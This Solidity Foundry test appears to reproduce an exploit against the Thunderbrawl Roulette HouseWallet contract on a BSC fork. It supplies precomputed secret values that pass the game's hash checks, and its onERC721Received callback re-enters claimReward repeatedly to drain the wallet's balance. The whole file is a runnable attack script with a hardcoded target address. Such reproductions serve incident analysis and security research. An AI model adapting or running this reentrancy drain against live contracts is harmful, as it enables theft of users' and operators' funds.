// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface HouseWallet {
    function winners(uint256 id, address player) external view returns (uint256);
    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount,
        bool _rewardStatus,
        uint256 _x,
        string memory name,
        address _add
    ) external;
    function shoot(
        uint256 random,
        uint256 gameId,
        bool feestate,
        uint256 _x,
        string memory name,
        address _add,
        bool nftcheck,
        bool dystopianCheck
    ) external payable;
}

contract ContractTest is Test {
    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
    uint256 randomNumber = 12_345_678_000_000_000_000_000_000;

    uint256 gameId = 1;
    bool feestate = false;
    // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate
    uint256 _x = 2_845_798_969_920_214_568_462_001_258_446;
    string name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;

    bool nftcheck = true;
    bool dystopianCheck = true;

    address payable add = payable(address(this));
    bool _rewardStatus = true;
    // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate
    uint256 _x1 = 969_820_990_102_090_205_468_486;
    string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract

    function setUp() public {
        cheats.createSelectFork("bsc", 21_785_004);
    }

    function testExploit() public {
        emit log_named_uint("Attacker THBR balance before exploit", THBR.balanceOf(address(this)));

        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
        uint256 _amount = houseWallet.winners(gameId, add);
        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);

        emit log_named_uint("Attacker THBR balance after exploit", THBR.balanceOf(address(this)));
    }

    receive() external payable {}

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external payable returns (bytes4) {
        uint256 _amount = houseWallet.winners(gameId, add);
        if (address(houseWallet).balance >= _amount * 2) {
            houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
        }
        return this.onERC721Received.selector;
    }
}
